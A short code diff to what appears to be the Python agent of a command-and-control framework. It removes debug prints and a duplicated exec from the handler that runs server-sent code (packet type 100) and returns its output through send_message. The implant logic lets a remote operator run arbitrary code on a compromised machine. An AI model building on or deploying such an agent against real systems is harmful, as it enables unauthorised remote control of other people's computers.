@@ -205,7 +205,6 @@ def process_tasking(data):
 
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
 
-        print("packet parsed")
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
@@ -378,14 +377,11 @@ def process_packet(packetType, data, resultID):
     elif packetType == 100:
         # dynamic code execution, wait for output, don't save outputPicl
         try:
-            print(data)
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
-            code_obj = compile(data, '<string>', 'exec')
-            exec(code_obj, globals())
             results = buffer.getvalue()
             send_message(build_response_packet(100, str(results), resultID))
         except Exception as e:
